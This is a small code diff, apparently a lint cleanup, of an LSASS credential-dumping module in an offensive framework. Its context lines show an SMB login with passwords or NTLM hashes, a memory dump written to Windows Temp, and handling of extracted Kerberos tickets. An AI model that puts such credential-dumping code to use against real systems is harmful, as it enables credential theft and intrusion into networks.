@@ -619,7 +619,7 @@ class LsassDumpModule(BaseModule):
 
         dump_id   = _uuid.uuid4().hex[:8].upper()
         dump_name = f"ARES{dump_id}.dmp"
-        tmp_path  = f"\\Windows\\Temp\\{dump_name}"
+        tmp_path  = f"\\Windows\\Temp\\{dump_name}"  # noqa: F841
 
         conn_smb = SMBConnection(target, target, timeout=20)
         conn_smb.login(username, password, domain, lmhash, nthash)
@@ -659,7 +659,7 @@ class LsassDumpModule(BaseModule):
         self._last_dump_data = b""
         try:
             local_dump, _fd = secure_mkstemp(suffix=".dmp", prefix="ares_lsass_")
-            import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd - close immediately, file will be written via SMB
+            import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd - close immediately, file will be written via SMB  # noqa: I001
 
             try:
                 with open(local_dump, "wb") as f:
@@ -885,7 +885,7 @@ class LsassDumpModule(BaseModule):
             if hasattr(instance, "_last_kerberos_tickets"):
                 instance._last_kerberos_tickets = kerberos_tickets
             elif not isinstance(instance, type):
-                setattr(instance, "_last_kerberos_tickets", kerberos_tickets)
+                instance._last_kerberos_tickets = kerberos_tickets
 
         if raw is not None:
             raw["kerberos_tickets"] = kerberos_tickets
